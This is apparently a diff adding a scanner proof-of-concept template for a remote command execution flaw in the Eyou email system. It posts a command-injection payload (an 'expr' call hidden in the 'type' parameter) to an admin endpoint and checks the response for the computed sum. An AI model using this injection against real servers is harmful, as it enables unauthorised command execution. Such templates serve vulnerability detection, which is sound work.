@@ -1,0 +1,26 @@
+id: poc-yaml-eyou-email-system-rce
+info:
+  name: 亿邮电子邮件系统远程命令执行漏洞（CNVD-2021-26422）
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CNVD-2021-26422
+  finger: Eyou
+  reference: []
+  description: null
+variables:
+  r1: random_int(100000, 910000)
+  r2: random_int(100000, 910000)
+transport: http
+requests:
+- method: POST
+  path: /webadm/?q=moni_detail.do&action=gragh
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type='|expr%20{{.r1}}%20%2B%20{{.r2}}||'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 + r2)
+  output: []
